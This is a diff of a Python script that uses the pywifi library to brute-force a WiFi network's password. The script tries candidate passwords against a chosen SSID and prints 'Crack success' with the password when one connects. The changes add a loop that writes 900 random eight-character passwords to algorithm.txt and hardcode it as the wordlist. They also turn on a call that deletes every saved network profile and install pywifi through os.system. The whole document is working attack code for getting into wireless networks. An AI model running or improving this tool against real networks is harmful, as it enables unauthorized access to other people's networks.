@@ -3,15 +3,17 @@ import sys
 import os
 import os.path
 import platform
+import string
 import re
 import time
+import random
 try:
     import pywifi
     from pywifi import PyWiFi
     from pywifi import const
     from pywifi import Profile
 except:
-    print("Installing pywifi")
+    os.system('pip install pywifi')
 
 
 RED   = "\033[1;31m"
@@ -48,20 +50,20 @@ def main(ssid, password, number):
 
 
     profile.key = password
-    #iface.remove_all_network_profiles()
+    iface.remove_all_network_profiles()
     tmp_profile = iface.add_network_profile(profile)
-    time.sleep(0.1) # if script not working change time to 1 !!!!!!
+    time.sleep(0.30) # if script not working change time to 1 !!!!!!
     iface.connect(tmp_profile) # trying to Connect
-    time.sleep(0.35) # 1s
+    time.sleep(0.30) # 1s
 
     if ifaces.status() == const.IFACE_CONNECTED: # checker
         time.sleep(1)
-        print(BOLD, GREEN,'[*] Crack success!',RESET)
-        print(BOLD, GREEN,'[*] password is ' + password, RESET)
+        print(BOLD, CYAN,'[*] Crack success!',RESET)
+        print(BOLD, CYAN,'[*] password is ' + password, RESET)
         input()
         exit()
     else:
-        print(RED, '[{}] denied {}'.format(number, password))
+        print(GREEN, '[{}] Failed {}'.format(number, password))
 
 def pwd(ssid, file):
     number = 0
@@ -73,8 +75,22 @@ def pwd(ssid, file):
             main(ssid, pwd, number)
 
 
+def repeatthis():
+    password = ""
+    passwordc = string.ascii_letters
+    password = string.digits
+
+    do = ''.join(random.choice(password+passwordc) for i in range(8))
+    print(do)
+
+    my_file = open("algorithm.txt","a+")
+    my_file.write(do)
+    my_file.write("\n")
+    
+    
 
 def menu():
+    os.system('cls')
     parser = argparse.ArgumentParser(description='argparse Example')
 
     parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
@@ -98,7 +114,7 @@ def menu():
     else:
         print(BLUE)
         ssid = input("[*] SSID: ")
-        filee = input("[*] pwds file: : ")
+        filee = 'algorithm.txt'
 
 
     # thx
@@ -116,4 +132,7 @@ def menu():
 
 
 if __name__ == "__main__":
+    for i in range(900):
+        repeatthis()
+    
     menu()
